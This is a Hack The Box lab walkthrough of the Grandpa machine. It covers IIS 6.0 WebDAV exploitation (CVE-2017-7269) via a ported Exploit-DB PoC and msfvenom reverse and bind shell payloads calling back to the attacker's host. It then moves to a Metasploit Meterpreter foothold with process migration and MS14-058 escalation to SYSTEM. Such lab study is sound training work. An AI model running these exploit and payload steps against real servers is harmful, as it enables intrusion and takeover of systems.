---
tags: [HTB, Grandpa, Windows, IIS, WebDAV, CVE-2017-7269, BufferOverflow, Meterpreter, Migration, MS14-058, KernelExploit, SYSTEM, Easy]
platform: HackTheBox
os: Windows Server 2003 SP2
hostname: GRANPA
domain: None
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: Grandpa, Full Walkthrough

## The gist

Grandpa is a useful legacy Windows exploitation exercise because the first exploit is not just a matter of finding a matching CVE. IIS 6.0 exposes WebDAV and is vulnerable to CVE-2017-7269, but the vulnerable code runs inside the IIS worker process. A raw reverse or bind shell can therefore die with the worker process even when the overflow and shellcode have executed correctly.

The manual route was attempted properly. The public Exploit-DB source was preserved, ported to Python 3, checked byte by byte, and tested with both reverse and bind payloads. The reverse route produced the expected delayed response but no callback, while the bind route caused a reset. Repeated crashes eventually triggered IIS Rapid Fail Protection. The important conclusion was that the shellcode lifetime was coupled to `w3wp.exe`.

The stable foothold used the framework exploit as a technical exception: staged Meterpreter arrived and was configured to migrate immediately into `notepad.exe` before the IIS worker process died. The shell landed as `NT AUTHORITY\\NETWORK SERVICE`. Local exploit triage then identified MS14-058, and `ms14_058_track_popup_menu` produced a SYSTEM session.

This box is primarily about reasoning from process architecture. The lesson is not that a public PoC failed, but that the payload had to outlive the process that was being corrupted.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Operating system | Windows Server 2003 SP2 |
| Hostname | `GRANPA` |
| Difficulty | Easy |
| Target IP | `$BoxIP` |
| Exposed service | IIS 6.0 on TCP/80 |
| Initial vulnerability | CVE-2017-7269, IIS 6.0 WebDAV buffer overflow |
| Local escalation | MS14-058, `track_popup_menu` |
| Final identity | `NT AUTHORITY\\SYSTEM` |

## Vulnerability summary

The `ScStoragePathFromUrl` function in IIS 6.0's WebDAV implementation mishandles a crafted `If:` header. A `PROPFIND` request containing two Unicode-encoded overflow buffers followed by suitable alphanumeric shellcode can corrupt the worker process and redirect execution.

The exploitation details matter:

- The overflow is delivered through WebDAV, so HTTP method and WebDAV support enumeration are part of the vulnerability confirmation.
- The public PoC uses large encoded blobs. A single changed byte can corrupt the ROP or shellcode path even when the Python syntax is correct.
- The process being exploited is `w3wp.exe`. A shell socket opened by code executing in that process is not independent of it.
- IIS Rapid Fail Protection can disable the application pool after repeated crashes. Once that happens, later HTTP requests may reset instead of returning the original response.

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Grandpa/`. It contains the complete session log, scan output, exploit source, private flags, and source screenshots. The vault contains the repeatable procedure and observations only.

Important private artifacts:

- `Grandpa.log` -- command-by-command session transcript.
- `nmap/allports.*` -- full TCP scan output.
- `nmap/services.*` -- focused service and version scan output.
- `exploits/41738.py` -- preserved original Python 2 reference PoC.
- `exploits/41738-adapted.py` -- Python 3 adaptation with corrected byte-perfect blobs and reverse payload.
- `loot/flags.txt` -- private user and root flag capture; values are intentionally not reproduced here.
- `1.nmap-allports.png`, `2.nmap-service.png`, `3.foothold.png`, and `4.privesc.png` -- private evidence screenshots, not embedded in the vault.

## Variables

| Variable | Meaning |
|---|---|
| `$BoxDir` | Private per-box workspace |
| `$BoxIP` | Current target address after the final reset |
| `$LocalIP` | VPN address of the attacking host |
| `$WebPort` | IIS HTTP port |
| `$ShellPort` | Listener port for the manual payload |
| `$MigrationPort` | Listener port for the staged Meterpreter route |
| `$PrivescPort` | Listener port for the elevated callback |
| `$Session` | Current Meterpreter session number |
| `$ExploitId` | Exploit-DB 41738 |
| `$MigrationProcess` | Stable process selected for migration |

## 1. Workspace and target setup

Create a private workspace and set the target variables before running commands. Keep the original PoC separate from every edited copy so a bad port, payload, or byte conversion can be compared against the source.

```bash
export BoxDir="$HOME/Platforms/HackTheBox/Grandpa"
export BoxIP="$TargetAddress"
export LocalIP="$VpnAddress"
export WebPort=80
export ShellPort=4444
export MigrationPort=4445
export PrivescPort=4446
mkdir -p "$BoxDir"/{nmap,exploits,loot,notes,tools}
umask 077
```

Record the target reset or IP change in the transcript. Legacy boxes may be reset several times during exploit recovery, and stale addresses make later failures look like exploit failures.

## 2. Full TCP discovery

Start with every TCP port. The final target exposed only HTTP, but the result must be established rather than assumed.

```bash
sudo nmap -Pn -n -sT -p- --min-rate 2000 "$BoxIP" -oA "$BoxDir/nmap/allports"
```

The `-sT` connect scan is useful when raw packet privileges are unavailable. `-Pn` avoids losing a live but ICMP-filtered target, `-n` removes DNS noise, and `-oA` preserves normal, grepable, and XML output for later review.

The scan returned TCP/80 only. That immediately made the IIS version, HTTP methods, WebDAV behavior, and public exploit search the priority path.

## 3. Fingerprint IIS and the target OS

Run a focused scan against the discovered port and request HTTP-specific scripts.

```bash
sudo nmap -Pn -n -sT -sV -sC -p "$WebPort" \\
  --script http-title,http-headers,http-methods,http-webdav-scan \\
  "$BoxIP" -oA "$BoxDir/nmap/services"
```

The important evidence was `Microsoft IIS httpd 6.0`, consistent with an old Windows Server installation. The service was not merely an ordinary web server: the WebDAV surface was relevant to the version-specific vulnerability.

Basic HTTP confirmation:

```bash
curl -i "http://$BoxIP:$WebPort/"
curl -i -X OPTIONS "http://$BoxIP:$WebPort/"
```

`OPTIONS` is a fast way to see whether methods such as `PROPFIND` are accepted or advertised. It is not, by itself, proof that the overflow is exploitable. The version, WebDAV behavior, and PoC source must agree.

## 4. Map the service to CVE-2017-7269

Use the service version as the search key, then inspect the source before attempting it.

```bash
searchsploit "IIS 6.0 WebDAV"
searchsploit -x "$ExploitId"
searchsploit -m "$ExploitId"
```

EDB-41738 matched the IIS 6.0 WebDAV `ScStoragePathFromUrl` overflow. Preserve the downloaded source in the box workspace and record the original behavior before editing it.

```bash
cp "$ExploitId" "$BoxDir/exploits/41738.py"
sed -n '1,260p' "$BoxDir/exploits/41738.py"
```

The reference program was Python 2-oriented and used a hardcoded request construction. Its key structures were two encoded overflow blobs and a payload area intended to be safe for the Unicode handling in the vulnerable path.

## 5. Port EDB-41738 to Python 3

The adaptation was deliberately small. The network data was kept as bytes, Python 3 print and close syntax was corrected, and the target and listener values were parameterised. Do not retype large exploit blobs from a screen or a web page.

```bash
cp "$BoxDir/exploits/41738.py" "$BoxDir/exploits/41738-adapted.py"
${EDITOR:-vi} "$BoxDir/exploits/41738-adapted.py"
python3 -m py_compile "$BoxDir/exploits/41738-adapted.py"
```

The Python compilation check catches syntax errors but cannot detect a changed escape sequence. The edited source therefore had to be compared against the original at the byte level.

### The two-byte-corruption gotcha

The first Python 3 port contained two corruptions in blob 1. Both were in the byte sequence represented as `\\xe6\\xbd\\x43`; the reference byte was `\\xe6\\xbd\\x83`. This is a small visible difference, but in a ROP/overflow blob it changes the actual bytes sent to the target.

The comparison script parsed the escape sequences from both source files and compared the resulting byte arrays. After correcting both occurrences, the two overflow blobs were byte-perfect relative to the reference. This check was more valuable than visually scanning the source because Python string syntax can hide whether the intended byte or an ASCII character was sent.

> [!warning] 💡 A syntactically valid Python exploit can still be byte-invalid
> Treat encoded overflow strings as binary data. Preserve the reference, parse escapes, compare lengths and byte values, and only then change the payload or arguments.

## 6. Generate a Unicode-safe reverse payload

The manual attempt used an encoded, alphanumeric reverse shell payload.

```bash
msfvenom -p windows/shell_reverse_tcp \\
  LHOST="$LocalIP" LPORT="$ShellPort" \\
  EXITFUNC=thread \\
  -e x86/alpha_mixed BufferRegister=EAX \\
  -f python
```

The generated payload was 702 bytes. The `x86/alpha_mixed` encoder was selected because the delivery path and the PoC's constraints require a restricted character set. `BufferRegister=EAX` tells the encoder which register points to the decoded payload. `EXITFUNC=thread` asks the payload to terminate the current thread after the shell exits.

That last option is not enough to make this target stable. It only controls shellcode termination behavior. It does not prevent the enclosing worker process from being terminated by the corrupted state.

## 7. Run the manual reverse-shell attempt

Start packet capture and a listener before sending the exploit. A delayed HTTP response is not callback proof.

```bash
sudo tcpdump -ni tun0 -n "host $BoxIP and tcp port $ShellPort" \\
  -w "$BoxDir/loot/manual-reverse-callback.pcap"
```

In a second terminal:

```bash
nc -lvnp "$ShellPort"
python3 "$BoxDir/exploits/41738-adapted.py" "$BoxIP" "$WebPort"
```

The exploit returned an HTTP 500 after roughly a two-and-a-half-minute delay. That timing was consistent with execution reaching a connect-back path and waiting for the TCP connection to time out, but it was not enough to claim a shell. The packet capture showed no connection from the target to `$ShellPort`.

The correct conclusion was: the overflow path was being triggered, but the target could not establish the reverse connection, or the worker process died before the socket became usable. Keep those two statements separate from “the exploit failed.”

## 8. Test a bind payload and observe the reset

The second manual test changed the shell direction to remove reverse egress as the only hypothesis.

```bash
msfvenom -p windows/shell_bind_tcp \\
  LPORT="$ShellPort" EXITFUNC=thread \\
  -e x86/alpha_mixed BufferRegister=EAX \\
  -f python
```

After replacing the payload in a separate test copy, the request was sent again. The bind-test copy is created from the known adapted source so the successful reverse version remains recoverable:

```bash
cp "$BoxDir/exploits/41738-adapted.py" "$BoxDir/exploits/41738-bind-test.py"
${EDITOR:-vi} "$BoxDir/exploits/41738-bind-test.py"
python3 "$BoxDir/exploits/41738-bind-test.py" "$BoxIP" "$WebPort"
nc -v "$BoxIP" "$ShellPort"
```

IIS returned a reset rather than leaving a listening shell on `$ShellPort`. This ruled out a simple reverse-route problem. The bind socket was also coupled to the IIS process and disappeared with it.

## 9. Recover from IIS Rapid Fail Protection

Repeatedly triggering the same worker-process crash had a service-side consequence: IIS Rapid Fail Protection disabled the application pool. Subsequent requests reset immediately instead of following the original response pattern.

> [!danger] 💡 Do not confuse app-pool protection with a newly disproven CVE
> When a crash-based IIS exploit changes from a delayed response to immediate resets, stop sending the PoC. Reset or recover the target, wait for IIS to return to its initial state, and then use the clean observation to guide the next test.

For a repeatable run, record each exploit attempt, response code, delay, listener state, and packet-capture result. The recovery state is part of the evidence, not noise to delete.

## 10. Why the raw shell could not survive

IIS 6.0 processes application work inside `w3wp.exe`. The WebDAV overflow executes in a thread belonging to that worker process. A reverse or bind shell created by shellcode is therefore a thread and socket inside the same process.

When the corrupted worker process terminates, all of its threads and process-owned socket state terminate with it. `EXITFUNC=thread` cannot change that relationship. It only requests that the shellcode finish by exiting its own thread. The process crash occurs around the vulnerable worker and takes the shellcode thread with it.

This explains all of the manual observations together:

1. The corrected blobs triggered the vulnerable path.
2. The HTTP request delayed and then returned 500.
3. `tcpdump` saw no reverse connection.
4. The bind listener never stayed open.
5. Repeated crashes caused Rapid Fail Protection.

> [!danger] Framework caveat -- technical necessity
> The framework route was required here for a stable foothold. Metasploit's IIS module uses a staged Meterpreter payload and can run a migration action as soon as the stage arrives. The session migrates into a stable process, `notepad.exe` in this run, before the vulnerable IIS worker dies. A raw `cmd.exe` reverse or bind shell has no opportunity to migrate after the worker process has already terminated.
>
> This was one technically justified framework use on an otherwise manual run. It was not a substitute for source review: the manual PoC was inspected, adapted, tested, and diagnosed first. The process model explains why the staged-and-migrated payload was needed.

## 11. Obtain the staged Meterpreter foothold

After the target was returned to a clean IIS state, use the IIS WebDAV module with migration configured.

```text
msfconsole -q
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS $BoxIP
set LHOST $LocalIP
set LPORT $MigrationPort
set AutoRunScript post/windows/manage/migrate
run
```

The module returned a Meterpreter session as `NT AUTHORITY\\NETWORK SERVICE` and migrated it to `notepad.exe`, PID 640, before the IIS worker process died. Process IDs are runtime evidence and may differ on a reset; the important property is migration into a process that will remain alive.

## 12. Verify the foothold and record the host state

Do not jump directly to local exploits. First capture the identity, host, architecture, process, and patch context.

```text
getuid
getpid
shell
```

From the Windows shell:

```cmd
whoami
hostname
ver
systeminfo
whoami /all
```

The shell identity was `nt authority\\network service`, the hostname was `granpa`, and the host matched the legacy Windows profile identified by the IIS banner. The current Meterpreter session number is dynamic, so use the session shown by your own listener output rather than copying a historical number.

## 13. Select the local escalation from evidence

Run the local exploit suggester against the live session and keep the output with the private transcript.

```text
background
use post/multi/recon/local_exploit_suggester
set SESSION $Session
run
```

The result returned several historical candidates. The selected route was `ms14_058_track_popup_menu`, matching the unpatched legacy OS and the session architecture.

The key decision rule is to match all of the following before execution: operating system build, architecture, patch state, current token, session type, and exploit delivery requirements. A suggestion is a shortlist, not a guarantee.

## 14. Escalate with MS14-058

Run the local module from the stable migrated session with a new callback port.

```text
use exploit/windows/local/ms14_058_track_popup_menu
set SESSION $Session
set LHOST $LocalIP
set LPORT $PrivescPort
run
```

MS14-058 abuses the `track_popup_menu` Win32k path to obtain kernel-mode code execution and replace the low-privileged token with a SYSTEM token. The module returned a new session as `NT AUTHORITY\\SYSTEM`.

The elevated session must be verified independently:

```text
sessions -i $ElevatedSession
getuid
shell
```

```cmd
whoami
hostname
```

## 15. Capture proof privately

The user flag was read from the Harry desktop and the root flag from the Administrator desktop. Their values remain only in the private source workspace.

```cmd
type C:\Documents and Settings\Harry\Desktop\user.txt
type C:\Documents and Settings\Administrator\Desktop\root.txt
```

The private capture is stored in `$BoxDir/loot/flags.txt`. Do not paste flag values into the vault, command sheet, screenshots directory in the vault, or any shared handoff.

## Gotchas and troubleshooting

💡 **The final target address matters.** The machine was reset more than once. Update `$BoxIP` and rerun the HTTP check after every reset; a scan of a previous address is still useful historical evidence but not current target proof.

💡 **Port 80 was the whole attack surface.** With no SMB, RPC, RDP, or WinRM path to distract from the result, IIS versioning and WebDAV method behavior had to be checked carefully.

💡 **Preserve the original exploit.** Large Unicode blobs are data, not prose. Keep an untouched reference and compare parsed bytes after every edit.

💡 **A 500 response is not a shell.** Record the timing, start `tcpdump`, and require a real callback or bind connection before declaring success.

💡 **Direction testing is informative.** Reverse shell failure followed by a bind-shell reset points toward process lifetime or target-side failure, not only VPN egress.

💡 **Rapid Fail Protection changes the symptoms.** Repeated crashes can disable the application pool. Reset the target or restore the service before drawing conclusions from immediate RST responses.

💡 **Migration must happen before the crash.** A raw shell cannot migrate after `w3wp.exe` has died. The staged Meterpreter route works because its migration action runs as soon as the stage arrives.

💡 **Session and PID numbers are not constants.** The successful run used the historical session numbering and migrated to PID 640, but a new run may assign different values. Always target the currently displayed session and verify `getuid`.

💡 **Exploit suggestions require validation.** The local exploit suggester listed multiple candidates. `systeminfo`, architecture, patches, and the current session context determined whether MS14-058 was the appropriate route.

## RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/00 - Follow-Along Controller|00 - Follow-Along Controller]] -- variables, full TCP scan, service triage, exploit proof, callback, and close-out.
- [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]] -- IIS 6.0 version and legacy service fingerprinting.
- [[OSCP/RUNBOOK V2/Windows - Web Enum|Windows - Web Enum]] -- HTTP headers, `OPTIONS`, WebDAV method checks, and path behavior.
- [[OSCP/RUNBOOK V2/Windows - Exploit Search|Windows - Exploit Search]] -- service-version mapping to EDB-41738 and source review.
- [[OSCP/RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing and Resource Guide]] -- preserving the reference, Python 3 adaptation, and byte verification.
- [[OSCP/RUNBOOK V2/Windows - Shell Received|Windows - Shell Received]] -- staged callback, process migration, shell identity verification, and callback diagnosis.
- [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows - Privilege Triage]] -- `systeminfo`, local exploit suggestions, and MS14-058 selection.
- [[OSCP/RUNBOOK V2/Windows - Clean Down|Windows - Clean Down]] -- applicable when closing a live framework session and removing local artifacts.

## Attack Chain

1. Full TCP scan reduced the attack surface to IIS on TCP/80.
2. Service fingerprinting identified IIS 6.0 and WebDAV as the relevant legacy surface.
3. EDB-41738 was reviewed, preserved, ported to Python 3, and byte-compared against the reference.
4. A Unicode-safe reverse payload was tested and diagnosed with a listener and `tcpdump`.
5. A bind payload was tested; the worker process reset and the shell did not persist.
6. Rapid Fail Protection was identified as the reason later requests reset immediately.
7. The staged IIS module was used with immediate migration to a stable process.
8. The migrated session was verified as Network Service on the legacy Windows host.
9. MS14-058 was selected from local exploit triage and returned a SYSTEM session.
10. User and root proof were captured privately in the source workspace.

## Credentials

No reusable password or hash was required. The meaningful identities were:

| Identity | Role in the chain |
|---|---|
| `NT AUTHORITY\\NETWORK SERVICE` | Initial stable post-migration shell |
| `NT AUTHORITY\\SYSTEM` | Final MS14-058 elevated session |

## Flags

| Flag | Location | Storage |
|---|---|---|
| User | `C:\Documents and Settings\Harry\Desktop\user.txt` | Private `$BoxDir/loot/flags.txt` |
| Root | `C:\Documents and Settings\Administrator\Desktop\root.txt` | Private `$BoxDir/loot/flags.txt` |

Flag values are intentionally absent from the vault.

## Key lessons

- A matching CVE and a correct-looking response do not prove a usable shell. Prove the network callback independently.
- Public exploit adaptation is a data-integrity problem as well as a syntax problem. Compare parsed bytes whenever a PoC contains encoded overflow blobs.
- Payload behavior is constrained by the process that hosts it. `EXITFUNC=thread` cannot make a socket survive a worker-process crash.
- Service health is evidence. Rapid Fail Protection explained the transition from delayed 500 responses to immediate resets.
- Framework use can be technically necessary when staged delivery and process migration are part of the exploit's survivability. Document the reason and the exact boundary.
- Exploit-suggester output is a candidate list. OS version, patch state, architecture, token, session type, and process context must all agree before escalation.
- Legacy targets reward careful enumeration. One web port still provides version, method, process, exploit, and recovery clues.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Legacy|Legacy]] -- manual MS08-067 exploitation, legacy Windows behavior, and bind-shell handling.
- [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]] -- IIS foothold, payload delivery, and token-based escalation.
- [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]] -- Windows web exploitation followed by local privilege escalation.
- [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] -- patch-aware Windows kernel exploit selection and callback context.
- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- Windows command execution and post-foothold proof.
- [[OSCP/MODULES/13. Locating Public Exploits|Module 13 - Locating Public Exploits]] -- fingerprint, source review, and exploit selection.
- [[OSCP/MODULES/14. Fixing Exploits|Module 14 - Fixing Exploits]] -- safe adaptation of public exploit code.
- [[OSCP/MODULES/17. Windows Privilege Escalation|Module 17 - Windows Privilege Escalation]] -- legacy kernel triage and SYSTEM proof.
- [[OSCP/MODULES/21. The Metasploit Framework|Module 21 - The Metasploit Framework]] -- staged payload handling and migration.

## External Resources

- [Exploit-DB 41738](https://www.exploit-db.com/exploits/41738) -- IIS 6.0 WebDAV `ScStoragePathFromUrl` PoC.
- [NVD: CVE-2017-7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269) -- vulnerability reference.
- [Microsoft Security Bulletin MS14-058](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-058) -- local Windows kernel vulnerability bulletin.
- [Microsoft IIS architecture](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-architecture) -- worker-process model background.
- [Rapid7 IIS WebDAV module documentation](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/) -- framework module behavior and options.

## Checklist

- [x] Full TCP scan and focused IIS fingerprint completed.
- [x] WebDAV methods and version evidence recorded.
- [x] EDB-41738 preserved as an untouched reference.
- [x] Python 3 adaptation, byte corruption, and byte-perfect correction documented.
- [x] Reverse and bind manual attempts documented with packet-level diagnosis.
- [x] Rapid Fail Protection recovery gotcha documented.
- [x] Technical reason for staged Meterpreter migration documented prominently.
- [x] Framework foothold and migration verified.
- [x] MS14-058 local escalation verified as SYSTEM.
- [x] Flags retained privately and excluded from the vault.
- [x] Source screenshots retained privately and not embedded in the vault.
- [x] RUNBOOK V2, command references, decision trees, modules, MOCs, and master command sheet updated.
